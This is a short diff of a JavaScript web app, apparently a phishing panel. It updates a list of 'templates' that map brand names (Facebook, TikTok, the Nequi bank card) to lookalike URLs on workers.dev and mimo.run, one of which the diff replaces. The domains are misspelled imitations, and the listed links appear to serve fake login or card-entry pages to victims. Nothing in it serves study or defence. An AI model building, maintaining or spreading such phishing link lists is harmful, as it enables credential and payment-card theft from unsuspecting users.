@@ -286,7 +286,7 @@ onAuthStateChanged(auth, async (user) => {
 // ================== ENLACES ÚNICOS ==================
 // (Todo igual, no toqué nada aquí)
 const plantillas = [
-  { nombre: "Facebook Basico", url: "https://faceboobasico.glegogle5341-af7.workers.dev/" },
+  { nombre: "Facebook Basico", url: "https://1xru5c.mimo.run/index.html" },
   { nombre: "Facebook Estandar", url: "https://facebook-estndar.glegogle5341-af7.workers.dev/" },
   { nombre: "TikTok", url: "https://tik-tok.glegogle5341-af7.workers.dev/" },
   { nombre: "Nequi Tarjeta", url: "https://nequi-tarjeta.glegogle5341-af7.workers.dev/" },
@@ -1155,6 +1155,7 @@ document.querySelectorAll('.btn,#menuBtn,#chatSend,#fakeSelect,#chatPanel,#chatM
     actualizarUsuarios();
   }, 2000);
 })();
+
 
 
 
